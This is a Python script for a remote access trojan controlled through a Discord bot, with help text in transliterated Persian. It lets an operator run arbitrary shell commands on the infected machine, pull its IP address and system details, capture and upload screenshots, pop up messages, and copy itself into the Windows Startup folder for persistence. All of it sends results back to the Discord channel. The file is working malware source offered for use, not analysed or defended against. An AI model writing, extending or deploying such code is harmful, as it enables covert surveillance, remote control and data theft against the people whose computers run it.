import telebot,requests,os,platform,autopy,getpass,subprocess
import discord

client = discord.Client()
@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))


@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.startswith('!start'):
        await message.channel.send("robot started")
	
    elif message.content.startswith('!ip'):

        x = requests.get("https://ipinfo.io")
        x = x.json()
        ip = x['ip']
        x = "target ip: "+ip
        await message.channel.send(x)

    elif message.content.startswith('!cmd'):
        x = message.content.replace("!cmd ","")
        x = os.popen(x).read()
        await message.channel.send(x)

    elif message.content.startswith('!sys'):
        pl1 = platform.platform()
        pl2 = platform.node()
        pl3 = platform.system()
        x = "platform : "+pl1+"\n node : "+pl2+'\n system : '+pl3
        await message.channel.send(x)

    elif message.content.startswith('!msg'):
        x = message.content.replace("!msg ","")
        print(x, type(x))
        autopy.alert.alert(x)

    elif message.content.startswith('!screen'):
        img = autopy.bitmap.capture_screen()
        img = img.save('a.png')
        photo = open('a.png','rb')
        await message.channel.send(file=discord.File(photo))

    elif message.content.startswith('!help'):
        x ='''
!help ==> rahnama\n
!start ==> start kardan bot\n
!ip ==> get ip\n
!cmd ==> command prompt\n
!sys ==> get sysinfo\n
!msg ==> alert message\n
!screen capture screen\n
'''
        await message.channel.send(x)

    elif message.content.startswith('!startup'):
        user = getpass.getuser()
        s = 'copy first_bot.py "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'.format(user)
        a = subprocess.check_output(s,shell=True)
        await message.channel.send(a)

client.run('Token')
